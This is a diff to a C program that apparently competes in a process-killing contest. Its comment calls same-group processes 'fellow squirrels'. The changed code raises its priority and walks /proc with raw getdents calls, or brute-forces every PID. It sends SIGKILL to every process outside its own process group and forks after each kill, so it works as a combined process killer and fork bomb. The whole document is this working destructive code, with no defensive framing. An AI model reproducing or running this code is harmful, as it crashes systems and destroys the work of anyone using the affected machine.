@@ -5,6 +5,7 @@
 #include <sys/types.h>
 #include <sys/time.h>
 #include <sys/resource.h>
+#include <sys/syscall.h>
 #include <errno.h>
 #include <signal.h>
 #include <time.h>
@@ -12,50 +13,55 @@
 #include <string>
 #include <dirent.h>
 #include <pthread.h>
+#include <sched.h>
+#include <sys/stat.h>
+#include <fcntl.h>
 
 #define MAX_PID 32768
-#define CNT_PTH 16
+#define SZ_BUFF 16384
+
+typedef struct {
+	long inode;
+	off_t off;
+	unsigned short len;
+	char name[];
+} e;
 
 inline void attack();
 inline void bite(int);
-inline void spawn();
 
-char* self;
 pid_t pgid;
-
+int kt;
 
 int main(int argc, char* argv[]) {
-
-	setpriority(PRIO_PROCESS, 0, -20);
-
-	self = strdup(argv[0]);
-
-	if (argc != 2) { pgid = getpid(); }
-	else           { pgid = atoi(argv[1]); }
-
-	if (setpgid(0, pgid)) {
-		printf("setpgid() failed!\n");
-	}
-	
+	setpgid(0, 0);
+	setpriority(PRIO_PGRP, 0, -20);
+	kt = atoi(argv[2]) * 3;
+	pgid = getpgid(0);
 	attack();
 }
 
 inline void attack(){
-	while (1) {
-		DIR *d;
-		struct dirent *e;
-
-		d = opendir("/proc");
-		if (d) {
-			while ((e = readdir(d))) {
-				int pid = atoi(e -> d_name);
-				if (pid) { bite(pid); }
-			}
-			closedir(d);
+	int fd = open("/proc", O_RDONLY | O_DIRECTORY);
+	if (fd == -1) {
+		while (1) { 
+			for (int i = getpid() - kt; i <= getpid() + kt; i++) { bite(i); }
+			for (int i = 1; i <= MAX_PID; i++) { bite(i); }
 		}
-		else {
-			for (int i = 1; i <= MAX_PID; i++) {
-				bite(i);
+	} 
+	else {
+		for (int i = getpid() - kt; i <= getpid() + kt; i++) { bite(i); }
+		e *ent;
+		int n, pid;
+		char buffer[SZ_BUFF];
+		while (1) {
+			n = syscall(SYS_getdents, fd, buffer, SZ_BUFF);
+			if (!n) { lseek(fd, 0, SEEK_SET); continue; }
+			for (int p = 0; p < n;) {
+				ent = (e*)(buffer + p);
+				pid = atoi(ent -> name);
+				bite(pid);
+				p += ent -> len;
 			}
 		}
 	}
@@ -64,15 +70,5 @@ inline void attack(){
 inline void bite(int pid) {
 	if (getpgid(pid) == pgid) return; // Fellow squirrel
 	kill(pid, SIGKILL);
-	spawn();
-}
-
-inline void spawn() {
-	int p = fork();
-	if (p == 0) {
-		char buffer[32];
-		sprintf(buffer, "%d", pgid);
-
-		execl(self, self, buffer, NULL);
-	}
+	fork();
 }
